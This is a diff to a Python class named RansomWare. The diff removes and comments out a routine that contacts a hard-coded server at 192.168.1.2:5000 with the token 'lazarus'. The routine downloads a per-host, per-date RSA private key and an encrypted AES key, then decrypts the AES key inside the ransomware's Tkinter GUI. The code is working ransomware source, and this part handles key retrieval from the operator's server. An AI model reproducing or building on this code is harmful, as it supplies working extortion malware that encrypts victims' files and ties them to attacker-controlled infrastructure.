@@ -1034,44 +1034,7 @@ class RansomWare:
 
         log_box = tk.Text(frame, height=10, bg="black", fg="lime", font=("Courier New", 10), borderwidth=1)
         log_box.pack(fill="x", padx=10, pady=(10, 0))
-
-        def attempt_auto_load_key():
-            try:
-                SERVER_URL = "http://192.168.1.2:5000"
-                TOKEN = "lazarus"
-                hostname = os.getenv("COMPUTERNAME") or socket.gethostname()
-                date_folder = datetime.datetime.now().strftime("%Y-%m-%d")
-
-                url_pem = f"{SERVER_URL}/download/{hostname}/{date_folder}/private.pem?token={TOKEN}"
-                url_bin = f"{SERVER_URL}/download/{hostname}/{date_folder}/aes_key.bin?token={TOKEN}"
-
-                temp_dir = tempfile.mkdtemp()
-                pem_path = os.path.join(temp_dir, "private.pem")
-                bin_path = os.path.join(temp_dir, "aes_key.bin")
-
-                with open(pem_path, "wb") as f:
-                    f.write(requests.get(url_pem).content)
-                with open(bin_path, "wb") as f:
-                    f.write(requests.get(url_bin).content)
-
-                with open(pem_path, "rb") as f:
-                    private_key = RSA.import_key(f.read())
-                with open(bin_path, "rb") as f:
-                    encrypted_key = f.read()
-
-                cipher_rsa = PKCS1_OAEP.new(private_key)
-                self.key = cipher_rsa.decrypt(encrypted_key)
-
-                if len(self.key) != 32:
-                    raise ValueError("Invalid AES key length")
-
-                log_box.insert(tk.END, "[✓] AES key auto-downloaded and decrypted from server.\n")
-                return True
-            except Exception as e:
-                log_box.insert(tk.END, f"[!] Auto-load from server failed: {e}\n")
-            return False
-
-
+      
         def unified_decrypt():
             try:
                 pem_path = filedialog.askopenfilename(
@@ -1138,7 +1101,7 @@ class RansomWare:
                                 font=("Courier New", 12), bg="lime", fg="black", width=24)
         btn_decrypt.pack(pady=(10, 10))
 
-        attempt_auto_load_key()
+        #attempt_auto_load_key()
         root.mainloop()
 
 
